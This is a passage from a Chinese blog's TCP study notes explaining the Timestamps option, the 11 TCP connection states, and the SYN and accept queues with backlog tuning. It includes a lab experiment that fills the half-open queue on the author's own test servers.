<h2 id="12-TCP-头部时间戳选项（TCP-Timestamps-Option，TSopt）"><a href="#12-TCP-头部时间戳选项（TCP-Timestamps-Option，TSopt）" class="headerlink" title="12 TCP 头部时间戳选项（TCP Timestamps Option，TSopt）"></a>12 TCP 头部时间戳选项（TCP Timestamps Option，TSopt）</h2><h3 id="Timestamps-选项是什么"><a href="#Timestamps-选项是什么" class="headerlink" title="Timestamps 选项是什么"></a>Timestamps 选项是什么</h3><p>除了我们之前介绍的 MSS、Window Scale 还有以一个非常重要的选项：时间戳（TCP Timestamps Option，TSopt）。这个选项在 TCP 头部的位置如下所示。</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/72.jpg"></p>
<h3 id="Timestamps-选项的组成部分"><a href="#Timestamps-选项的组成部分" class="headerlink" title="Timestamps 选项的组成部分"></a>Timestamps 选项的组成部分</h3><p>在 Wireshark 抓包中，常常会看到 TSval 和 TSecr 两个选项，值得注意的是第二个选项 TSecr 不是 secrets 的意思，而是 “TS Echo Reply” 的缩写，TSval 和 TSecr 是 TCP 选项时间戳的一部分。</p>
<p>TCP Timestamps Option 由四部分构成：<code>类别</code>（kind）、<code>长度</code>（Length）、<code>发送方时间戳</code>（TS value）、<code>回显时间戳</code>（TS Echo Reply）。时间戳选项类别（kind）的值等于 8，用来与其它类型的选项区分。长度（length）等于 10。两个时间戳相关的选项都是 4 字节。</p>
<p>如下图所示：</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/73.jpg"></p>
<p>是否使用时间戳选项是在三次握手里面的 SYN 报文里面确定的。下面的包是<code>curl github.com</code>抓包得到的结果。</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/74.jpg"></p>
<p>1.发送方发送数据时，将一个发送时间戳 1734581141 放在发送方时间戳<code>TSval</code>中</p>
<p>2.接收方收到数据包以后，将收到的时间戳 1734581141 原封不动的返回给发送方，放在<code>TSecr</code>字段中，同时把自己的时间戳 3303928779 放在<code>TSval</code>中</p>
<p>3.后面的包以此类推</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/75.jpg"></p>
<h3 id="Timestamps-选项的作用"><a href="#Timestamps-选项的作用" class="headerlink" title="Timestamps 选项的作用"></a>Timestamps 选项的作用</h3><p>Timestamps 选项的提出初衷是为了解决两个问题：</p>
<p>1、<code>两端往返时延测量</code>（RTTM）</p>
<p>2、序列号回绕（PAWS），接下来我们来进行介绍。</p>
<h4 id="测量-RTTM"><a href="#测量-RTTM" class="headerlink" title="测量 RTTM"></a>测量 RTTM</h4><p>发送端在收到接收方发出的 ACK 报文以后，就可以通过这个响应报文的 TSecr</p>
<p>在启用 timestamp 选项之前，测量 RTT 的过程如下。</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/76.jpg"></p>
<p>TCP 在发送一个包时，会记录这个包的发送的时间 t1，用收到这个包的确认包时 <code>t2 减去 t1</code> 就可以得到这次的 <code>RTT</code>。这里有一个问题，如果发出的包出现重传，计算就变得复杂起来，如下所示。</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/77.jpg"></p>
<p>这里的 RTT 到底是 t3 - t1 还是 t3 - t2 呢？这两种方式无论选择哪一种都不太合适，无法得知收到的确认 ACK 是对第一次包还是重传包的的确认。TCP RFC6298 对这种行为的处理是不对重传包进行 RTT 计算，这样计算不会带来错误，但<code>当所有包都出现重传的情况下，将没有包可用来计算 RTT</code>。</p>
<p>在启用 Timestamps 选项以后，因为 ACK 包里包含了 <code>TSval</code> 和 <code>TSecr</code>，这样无论是正常确认包，还是重传确认包，都可以通过这两个值计算出 RTT。</p>
<h4 id="PAWS"><a href="#PAWS" class="headerlink" title="PAWS"></a>PAWS</h4><p>Timestamps 选项带来的第二个作用是帮助判断 PAWS，TCP 的序列号用 32bit 来表示，因此在 2^32 字节的数据传输后序列号就会<code>溢出回绕</code>。TCP 的窗口经过窗口缩放可以最高到 <code>1GB</code>（2^30)，在高速网络中，序列号在很短的时间内就会被重复使用。</p>
<p>下面以一个实际的例子来说明，如下图所示。</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/78.jpg"></p>
<p>假设发送了 6 个数据包，每个数据包的大小为 1GB，第 5 个包序列号发生回绕。第 2 个包因为某些原因延迟导致重传，但没有丢失到时间 t7 才到达。这个迷途数据包与后面要发送的第 6 个包序列号完全相同，如果没有一些措施进行区分，将会造成数据的紊乱。</p>
<p>如果有 Timestamps 的存在，内核会维护一个为每个连接维护一个 ts_recent 值，记录最后一次通信的的 timestamps 值，在 t7 时间点收到迷途数据包 2 时，由于数据包 2 的 timestamps 值<code>小于 ts_recent </code>值，就会<code>丢弃掉这个数据包</code>。等 t8 时间点真正的数据包 6 到达以后，由于数据包 6 的 timestamps 值<code>大于 ts_recent</code>，这个包可以被<code>正常接收</code>。``</p>
<h3 id="补充说明"><a href="#补充说明" class="headerlink" title="补充说明"></a>补充说明</h3><p>有几个需要说明的点</p>
<p>1.<code>timestamps 值是一个单调递增的值</code>，与我们所知的 epoch 时间戳不是一回事，这个选项不要求两台主机进行时钟同步。两端 timestamps 值增加的间隔也可能<code>步调不一致</code>，比如一条主机以每 1ms 加一的方式递增，另外一条主机可以以每 1s 加一的方式递增。</p>
<p>2.与序列号一样，既然是递增 timestamps 值也是会<code>溢出回绕</code>的。</p>
<p>3.timestamps 是一个<code>双向的选项</code>，如果只要有一方不开启，双方都将停用 timestamps。比如下面是curl <a target="_blank" rel="noopener" href="http://www.baidu.com得到的包./">www.baidu.com得到的包。</a></p>
<h3 id="Timestamps-选项造成的-RST"><a href="#Timestamps-选项造成的-RST" class="headerlink" title="Timestamps 选项造成的 RST"></a>Timestamps 选项造成的 RST</h3><p>三次握手中的第二步，如果服务端回复 SYN+ACK 包中的 TSecr 不等于握手第一步客户端发送 SYN 包中的 TSval，客户端在对 SYN+ACK 回复 RST。</p>
<h2 id="13-状态机魔鬼-——-TCP-11-种状态变迁及模拟重现"><a href="#13-状态机魔鬼-——-TCP-11-种状态变迁及模拟重现" class="headerlink" title="13 状态机魔鬼 —— TCP 11 种状态变迁及模拟重现"></a>13 状态机魔鬼 —— TCP 11 种状态变迁及模拟重现</h2><p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/79.jpg"></p>
<h3 id="1、CLOSED"><a href="#1、CLOSED" class="headerlink" title="1、CLOSED"></a>1、CLOSED</h3><p>这个状态是一个「假想」的状态，是 TCP 连接还未开始建立连接或者连接已经彻底释放的状态。因此<code>CLOSED</code>状态也无法通过 <code>netstat</code> 或者 <code>lsof</code> 等工具看到。</p>
<h3 id="2、LISTEN"><a href="#2、LISTEN" class="headerlink" title="2、LISTEN"></a>2、LISTEN</h3><p>一端（通常是服务端）调用 <code>bind</code>、<code>listen</code> 系统调用监听特定端口时进入到<code>LISTEN</code>状态，等待客户端发送 <code>SYN</code> 报文三次握手建立连接。</p>
<p>在 Java 中只用一行代码就可以构造一个 listen 状态的 socket。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ServerSocket serverSocket &#x3D; new ServerSocket(9999);</span><br></pre></td></tr></table></figure>
<p>ServerSocket 的构造器函数最终调用了 <code>bind</code>、<code>listen</code>，接下来就可以调用 <code>accept</code> 接收客户端连接请求了。</p>
<p>使用 <code>netstat</code> 进行查看</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netstat -tnpa | grep -i 9999                     </span><br><span class="line">tcp6       0      0 :::9999     :::*                    LISTEN      20096&#x2F;java       </span><br></pre></td></tr></table></figure>
<p>处于<code>LISTEN</code>状态的连接收到<code>SYN</code>包以后会发送 <code>SYN+ACK</code> 给对端，同时进入<code>SYN-RCVD</code>阶段</p>
<h3 id="3、SYN-SENT"><a href="#3、SYN-SENT" class="headerlink" title="3、SYN-SENT"></a>3、SYN-SENT</h3><p>客户端发送 SYN 报文等待 ACK 的过程进入 SYN-SENT状态。<code>同时会开启一个定时器</code>，如果超时还没有收到ACK会重发 SYN。</p>
<h3 id="4、SYN-RCVD"><a href="#4、SYN-RCVD" class="headerlink" title="4、SYN-RCVD"></a>4、SYN-RCVD</h3><p>服务端收到<code>SYN</code>报文以后会回复 <code>SYN+ACK</code>，然后等待对端 ACK 的时候进入<code>SYN-RCVD</code>。</p>
<h3 id="5、ESTABLISHED"><a href="#5、ESTABLISHED" class="headerlink" title="5、ESTABLISHED"></a>5、ESTABLISHED</h3><p><code>SYN-SENT</code>或者<code>SYN-RCVD</code>状态的连接收到对端确认ACK以后进入<code>ESTABLISHED</code>状态，连接建立成功。</p>
<p>从图中可以看到ESTABLISHED状态的连接有两种可能的状态转换方式:</p>
<p>1.调用 <code>close</code> 等系统调用主动关闭连接，这个时候会发送 FIN 包给对端，同时自己进入<code>FIN-WAIT-1</code>状态</p>
<p>2.收到对端的 FIN 包，执行被动关闭，收到 FIN 包以后会回复 ACK，同时自己进入<code>CLOSE-WAIT</code>状态</p>
<h3 id="6、FIN-WAIT-1"><a href="#6、FIN-WAIT-1" class="headerlink" title="6、FIN-WAIT-1"></a>6、FIN-WAIT-1</h3><p>主动关闭的一方发送了 FIN 包，等待对端回复<code>ACK</code>时进入<code>FIN-WAIT-1</code>状态。</p>
<p>FIN_WAIT1状态的切换如下几种情况</p>
<p>当收到 <code>ACK</code> 以后，<code>FIN-WAIT-1</code>状态会转换到<code>FIN-WAIT-2</code>状态</p>
<p>当收到 <code>FIN</code> 以后，会回复对端 <code>ACK</code>，<code>FIN-WAIT-1</code>状态会转换到CLOSING状态</p>
<p>当收到 <code>FIN+ACK</code> 以后，会回复对端 ACK，FIN-WAIT-1状态会转换到<code>TIME_WAIT</code>状态，跳过了<code>FIN-WAIT-2</code>状态</p>
<h3 id="7、FIN-WAIT-2"><a href="#7、FIN-WAIT-2" class="headerlink" title="7、FIN-WAIT-2"></a>7、FIN-WAIT-2</h3><p>处于 <code>FIN-WAIT-1</code>状态的连接收到 ACK 确认包以后进入<code>FIN-WAIT-2</code>状态，这个时候主动关闭方的 FIN 包已经被对方确认，等待被动关闭方发送 FIN 包。</p>
<p>当收到对端的 FIN 包以后，主动关闭方进入<code>TIME_WAIT</code>状态</p>
<h3 id="8、CLOSE-WAIT"><a href="#8、CLOSE-WAIT" class="headerlink" title="8、CLOSE-WAIT"></a>8、CLOSE-WAIT</h3><p>当有一方想关闭连接的时候，调用 close 等系统调用关闭 TCP 连接会发送 FIN 包给对端，这个被动关闭方，收到 FIN 包以后进入<code>CLOSE-WAIT</code>状态。</p>
<p>当被动关闭方有数据要发送给对端的时候，可以继续发送数据。当没有数据发送给对方时，也会调用 close 等系统调用关闭 TCP 连接，发送 FIN 包给主动关闭的一方，同时进入<code>LAST-ACK</code>状态</p>
<h3 id="9、TIME-WAIT"><a href="#9、TIME-WAIT" class="headerlink" title="9、TIME-WAIT"></a>9、TIME-WAIT</h3><p><code>TIME-WAIT</code>可能是所有状态中面试问的最频繁的一种状态了。这个状态是收到了被动关闭方的 FIN 包，发送确认 ACK 给对端，开启 2MSL 定时器，定时器到期时进入 <code>CLOSED</code> 状态，连接释放。</p>
<h3 id="10、LAST-ACK"><a href="#10、LAST-ACK" class="headerlink" title="10、LAST-ACK"></a>10、LAST-ACK</h3><p><code>LAST-ACK</code> 顾名思义等待最后的 ACK。是被动关闭的一方，发送 FIN 包给对端等待 ACK 确认时的状态。</p>
<p>当收到 ACK 以后，进入 <code>CLOSED</code> 状态，连接释放。</p>
<h3 id="11、CLOSING"><a href="#11、CLOSING" class="headerlink" title="11、CLOSING"></a>11、CLOSING</h3><p><code>CLOSING</code>状态在「同时关闭」的情况下出现。这里的同时关闭中的「同时」其实并不是时间意义上的同时，而是指的是在发送 FIN 包还未收到确认之前，收到了对端的 FIN 的情况。</p>
<p>整个过程如下图所示</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/80.jpg"></p>
<h3 id="小结-5"><a href="#小结-5" class="headerlink" title="小结"></a>小结</h3><p>到这里，TCP 的 11 种状态就介绍完了，我为了你准备了几道试题，看下自己的掌握的情况吧。</p>
<h3 id="作业题-4"><a href="#作业题-4" class="headerlink" title="作业题"></a>作业题</h3><p>1、下列TCP连接建立过程描述正确的是：(C)</p>
<pre><code>A、服务端收到客户端的 SYN 包后等待 2*MSL 时间后就会进入 SYN_SENT 状态
B、服务端收到客户端的 ACK 包后会进入 SYN_RCVD 状态
C、当客户端处于 ESTABLISHED 状态时，服务端可能仍然处于 SYN_RCVD 状态
D、服务端未收到客户端确认包，等待 2*MSL 时间后会直接关闭连接</code></pre>
<p>2、TCP连接关闭，可能有经历哪几种状态：(BC)</p>
<pre><code>A、LISTEN
B、TIME-WAIT
C、LAST-ACK
D、SYN-RECEIVED</code></pre>
<h2 id="14-另辟蹊径看三次握手-——-全连接队列和半连接队列与-backlog"><a href="#14-另辟蹊径看三次握手-——-全连接队列和半连接队列与-backlog" class="headerlink" title="14 另辟蹊径看三次握手 —— 全连接队列和半连接队列与 backlog"></a>14 另辟蹊径看三次握手 —— 全连接队列和半连接队列与 backlog</h2><h3 id="半连接队列、全连接队列基本概念"><a href="#半连接队列、全连接队列基本概念" class="headerlink" title="半连接队列、全连接队列基本概念"></a>半连接队列、全连接队列基本概念</h3><p>为了理解 backlog，我们需要了解 <code>listen</code> 和 <code>accept</code> 函数背后的发生了什么。backlog 参数跟 listen 函数有关，listen 函数的定义如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int listen(int sockfd, int backlog);</span><br></pre></td></tr></table></figure>
<p>当服务端调用 listen 函数时，TCP 的状态被从 CLOSE 状态变为 LISTEN，于此同时内核创建了两个队列：</p>
<p>1.<code>半连接队列</code>（Incomplete connection queue），又称 <code>SYN 队列</code></p>
<p>2.<code>全连接队列</code>（Completed connection queue），又称 <code>Accept 队列</code></p>
<p>如下图所示。</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/81.jpg"></p>
<h3 id="半连接队列（SYN-Queue）"><a href="#半连接队列（SYN-Queue）" class="headerlink" title="半连接队列（SYN Queue）"></a>半连接队列（SYN Queue）</h3><p>当客户端发起 SYN 到服务端，服务端收到以后会回 ACK 和自己的 SYN。这时服务端这边的 TCP 从 listen 状态变为 <code>SYN_RCVD</code> (SYN Received)，此时会将这个连接信息放入「半连接队列」，半连接队列也被称为 <code>SYN Queue</code>，存储的是 “inbound SYN packets”。</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/82.jpg"></p>
<p>服务端回复 <code>SYN+ACK</code> 包以后等待客户端回复 ACK，同时开启一个定时器，如果超时还未收到 ACK 会进行 SYN+ACK 的重传，重传的次数由 <code>tcp_synack_retries</code> 值确定。在 CentOS 上这个值等于 <code>5</code>。</p>
<p>一旦收到客户端的 <code>ACK</code>，服务端就开始尝试把它加入另外一个<code>全连接队列</code>（Accept Queue）。</p>
<h3 id="半连接队列的大小的计算"><a href="#半连接队列的大小的计算" class="headerlink" title="半连接队列的大小的计算"></a>半连接队列的大小的计算</h3><p>半连接队列的大小与三个值有关：</p>
<p>1.用户层 listen 传入的backlog</p>
<p>2.系统变量 <code>net.ipv4.tcp_max_syn_backlog</code>，默认值为 128</p>
<p>3.系统变量 <code>net.core.somaxconn</code>，默认值为 128</p>
<p>下面给了几个 somaxconn、max_syn_backlog、backlog 三者之间不同组合的最终半连接队列大小值。</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/83.jpg"></p>
<p>可以看到:</p>
<p>1.在系统参数不修改的情形，盲目调大 <code>listen</code> 的 backlog 对最终半连接队列的大小不会有影响。</p>
<p>2.在 listen 的 <code>backlog</code> 不变的情况下，盲目调大 <code>somaxconn</code> 和 <code>max_syn_backlog</code> 对最终半连接队列的大小不会有影响</p>
<h3 id="模拟半连接队列占满"><a href="#模拟半连接队列占满" class="headerlink" title="模拟半连接队列占满"></a>模拟半连接队列占满</h3><p>以 somaxconn=128、tcp_max_syn_backlog=128、listen backlog=50 为例，模拟的原理是在三次握手的第二步，客户端在收到服务端回复的 SYN+ACK 以后使用 iptables 丢弃这个包。这里实验的服务端是 10.211.55.10，客户端是 10.211.55.20，在客户端使用 iptables 增加一条规则，如下所示。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo  iptables --append INPUT  --match tcp --protocol tcp --src 10.211.55.10 --sport 9090 --tcp-flags SYN SYN --jump DROP</span><br></pre></td></tr></table></figure>
<p>这条规则的含义是丢弃来自 ip 为 10.211.55.10，源端口号为 9090 的 SYN 包，如下图所示。</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/84.jpg"></p>
<p>接下来使用你喜欢的语言，开始发起连接就好了，这里选择了 go，代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">func main() &#123;</span><br><span class="line">	for i :&#x3D; 0; i &lt; 2000; i++ &#123;</span><br><span class="line">		go connect()</span><br><span class="line">	&#125;</span><br><span class="line">	time.Sleep(time.Minute * 10)</span><br><span class="line">&#125;</span><br><span class="line">func connect() &#123;</span><br><span class="line">	_, err :&#x3D; net.Dial(&quot;tcp4&quot;, &quot;10.211.55.10:9090&quot;)</span><br><span class="line">	if err !&#x3D; nil &#123;</span><br><span class="line">		fmt.Println(err)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>执行这个 go 程序，在服务端使用 netstat 查看当前 9090 端口的连接状态，如下所示。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">netstat -lnpa | grep :9090  | awk &#39;&#123;print $6&#125;&#39; | sort | uniq -c | sort -rn</span><br><span class="line">     64 SYN_RECV</span><br><span class="line">      1 LISTEN</span><br></pre></td></tr></table></figure>
<p>可以观察到 SYN_RECV 状态的连接个数的从 0 开始涨到 64，就不再上涨了，这里的 64 就是半连接队列的大小。</p>
<p>接下来我们来看全连接队列</p>
<h3 id="全连接队列（Accept-Queue）"><a href="#全连接队列（Accept-Queue）" class="headerlink" title="全连接队列（Accept Queue）"></a>全连接队列（Accept Queue）</h3><p>「全连接队列」包含了服务端所有完成了三次握手，但是还未被应用调用 accept 取走的连接队列。此时的 socket 处于 <code>ESTABLISHED</code> 状态。每次应用调用 accept() 函数会移除队列头的连接。如果队列为空，accept() 通常会阻塞。全连接队列也被称为 Accept 队列。</p>
<p>你可以把这个过程想象生产者、消费者模型。<code>内核</code>是一个负责三次握手的<code>生产者</code>，握手完的连接会放入一个队列。我们的<code>应用程序</code>是一个<code>消费者</code>，取走队列中的连接进行下一步的处理。这种生产者消费者的模式，在生产过快、消费过慢的情况下就会出现队列积压。</p>
<p><code>listen</code> 函数的第二个参数 backlog 用来设置全连接队列大小，但不一定就会选用这一个 backlog 值，还受限于 <code>somaxconn</code>，等下会有更详细的内容说明全连接队列大小的计算规则。</p>
<p><code>int listen(int sockfd, int backlog)</code></p>
<p>如果全连接队列满，内核会舍弃掉 client 发过来的 ack（应用层会认为此时连接还未完全建立）</p>
<p>我们来模拟一下全连接队列满的情况。因为只有 <code>accept</code> 才会移除全连接的队列，所以如果我们只 <code>listen</code>，不调用 <code>accept</code>，那么很快全连接就可以被占满。</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/85.jpg"></p>
<p><code>SYN+ACK</code>重传的次数是由操作系统的一个文件决定的<code>/proc/sys/net/ipv4/tcp_synack_retries</code>，可以用 cat 查看这个文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;tcp_synack_retries</span><br><span class="line">5</span><br></pre></td></tr></table></figure>
<p>整个过程如下图所示：</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/86.jpg"></p>
<h3 id="全连接队列的大小"><a href="#全连接队列的大小" class="headerlink" title="全连接队列的大小"></a>全连接队列的大小</h3><p>全连接队列的大小是 listen 传入的 backlog 和 somaxconn 中的较小值。</p>
<p>全连接队列大小判断是否满的函数是 /include/net/sock.h 中 的 sk_acceptq_is_full 方法。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">static inline bool sk_acceptq_is_full(const struct sock *sk)</span><br><span class="line">&#123;</span><br><span class="line">	return sk-&gt;sk_ack_backlog &gt; sk-&gt;sk_max_ack_backlog;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里本身没有什么毛病，只是 sk_ack_backlog 是从 0 开始计算的，所以真正全连接队列大小是 <code>backlog + 1</code>。当你指定 backlog 值为 1 时，能容纳的连接个数会是 2。《Unix 网络编程卷一》87 页 4.5 节有详细的对比各个操作系统 backlog 与实际全连接队列最大数量之间的关系。</p>
<h3 id="ss-命令"><a href="#ss-命令" class="headerlink" title="ss 命令"></a>ss 命令</h3><p>ss 命令可以查看全连接队列的大小和当前等待 accept 的连接个数，执行 <code>ss -lnt</code> 即可，比如上面的 accept 队列满的例子中，执行 ss 命令的输出结果如下。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ss -lnt | grep :9090</span><br><span class="line">State      Recv-Q Send-Q Local Address:Port               Peer Address:Port</span><br><span class="line">LISTEN     51     50           *:9090                     *:*</span><br></pre></td></tr></table></figure>
<p>对于 LISTEN 状态的套接字，<code>Recv-Q</code> 表示 <code>accept 队列</code>排队的连接个数，<code>Send-Q</code> 表示全连接队列（也就是 accept 队列）的<code>总大小</code>。</p>
<h3 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h3><h4 id="多大的-backlog-是合适的"><a href="#多大的-backlog-是合适的" class="headerlink" title="多大的 backlog 是合适的"></a>多大的 backlog 是合适的</h4><p>前面讲了这么多，应用程序设置多大的 backlog 是合理的呢？</p>
<p>答案是 It depends，根据不同过的业务场景，需要做对应的调整。</p>
<p>1.你如果的接口处理连接的速度要求非常高，或者在做压力测试，很有必要调高这个值</p>
<p>2.如果业务接口本身性能不好，accept 取走已建连的速度较慢，那么把 backlog 调的再大也没有用，只会增加连接失败的可能性</p>
<p>可以举个典型的 <code>backlog</code> 值供大家参考，Nginx 和 Redis 默认的 backlog 值等于 <code>511</code>，Linux 默认的 backlog 为 <code>128</code>，Java 默认的 backlog 等于 <code>50</code></p>
<h4 id="tcp-abort-on-overflow-参数"><a href="#tcp-abort-on-overflow-参数" class="headerlink" title="tcp_abort_on_overflow 参数"></a>tcp_abort_on_overflow 参数</h4><p>默认情况下，全连接队列满以后，服务端会忽略客户端的 ACK，随后会重传SYN+ACK，也可以修改这种行为，这个值由<code>/proc/sys/net/ipv4/tcp_abort_on_overflow</code>决定。<br>1.<code>tcp_abort_on_overflow</code> 为 0 表示三次握手最后一步全连接队列满以后 server 会丢掉 client 发过来的 ACK，服务端随后会进行重传 SYN+ACK。</p>
<p>2.<code>tcp_abort_on_overflow</code> 为 1 表示全连接队列满以后服务端直接发送 RST 给客户端。</p>
<p>但是回给客户端 RST 包会带来另外一个问题，客户端不知道服务端响应的 RST 包到底是因为「该端口没有进程监听」，还是「该端口有进程监听，只是它的队列满了」</p>
<h3 id="小结-6"><a href="#小结-6" class="headerlink" title="小结"></a>小结</h3><p>这篇文章我们从 backlog 参数为入口来研究了半连接队列、全连接队列的关系。简单回顾一下。</p>
<p>1.半连接队列：服务端收到客户端的 SYN 包，回复 SYN+ACK 但是还没有收到客户端 ACK 情况下，会将连接信息放入半连接队列。半连接队列又被称为 <code>SYN 队列</code>。<br>2.全连接队列：服务端完成了三次握手，但是还未被 accept 取走的连接队列。全连接队列又被称为 <code>Accept 队列</code>。<br>3.半连接队列的大小与用户 listen 传入的 <code>backlog</code>、<code>net.core.somaxconn</code>、<code>net.core.somaxconn</code> 都有关系，准确的计算规则见上面的源码分析<br>4.全连接队列的大小是用户 listen 传入的 <code>backlog</code> 与 <code>net.core.somaxconn</code> 的较小值  </p>
